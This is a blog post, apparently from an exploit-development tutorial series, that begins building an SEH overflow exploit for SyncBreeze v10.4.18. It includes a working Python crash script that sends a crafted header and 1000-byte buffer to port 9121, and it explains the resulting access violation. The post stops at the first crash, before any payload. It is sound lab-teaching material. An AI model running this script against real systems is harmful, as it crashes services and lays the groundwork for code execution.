---
title: Building SyncBreeze Exploits (Part 2) - 10.4.18 SEH Overflow
categories:
  - offensive-security
tags:
---
In the previous post, I demonstrated how to build a custom exploit for SyncBreeze v10.0.28. In this installment, we'll exploit SyncBreeze v10.4.18, which contains a similar vulnerability but requires an SEH overflow approach instead.

With a standard buffer overflow, you overflow the input buffer and overwrite the return address on the stack, hijacking the normal execution flow when the function returns. An SEH overflow employs a different technique: we overflow the buffer to overwrite the Structured Exception Handler (SEH) chain stored on the stack. When we subsequently trigger an exception (often caused by the overflow itself), Windows attempts to process the exception using our corrupted handler pointers, giving us control of execution.

# Setting up the Lab

I'll be using the same tools and environment as described in Part 1, with the exception of using SyncBreeze v10.4.18. You can download this version and view the proof-of-concept exploit here: https://www.exploit-db.com/exploits/43936

# Triggering the Crash & Identifying the Entry Point

Our first step is to identify the vulnerability in the application. Since a proof-of-concept already exists (linked above), we can use it as a reference to understand where to focus our efforts and begin crafting a basic exploit to trigger the crash.

From the PoC, we can determine that the vulnerable endpoint listens on port 9121 and requires a specific header format. Our initial exploit to crash the application looks like this:
```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 9121
    size = 1000
    inputBuffer = b"\x41" * size
    
    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])
    
    buf = header + inputBuffer
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    print("Done!")
    
except socket.error:
    print("Could not connect!")
```

The `inputBuffer` contains 1000 'A' characters (`\x41` in hex), which will overflow the vulnerable buffer. The header is constructed to match the application's expected protocol format. When assembled, the 24-byte header appears as:
```
75 19 ba ab 03 00 00 00 00 40 00 00 e8 03 00 00 e8 03 00 00 41 00 00 00
```

The `pack()` function converts Python integers into binary format suitable for network transmission. Its first argument specifies the format: `<` indicates little-endian byte order (standard for Windows/x86), and `I` represents an unsigned 4-byte integer. The second argument is the value to convert.

In our header construction:
- `pack('<I', len(inputBuffer))` converts 1000 to `\xe8\x03\x00\x00` (1000 in little-endian format)
- `pack('<I', inputBuffer[-1])` converts 65 to `\x41\x00\x00\x00` (the byte value of 'A' is 65 in ASCII, packed as a 4-byte integer)

The complete buffer sent to the server is 1024 bytes: the 24-byte header followed by 1000 bytes of payload.

---

Sending the exploit, we trigger an access violation (`c0000005`), and we can see that the EAX register contains `41414141`. The access violation occured because we derefenced a pointer that was on the EAX register when we filled it with "A"s. The register was attempting to execute an instruction `+0x24` offset from EAX. And finally, we do not have direct control over the EIP

![seh_first_crash.png](../assets/images/seh_first_crash.png)

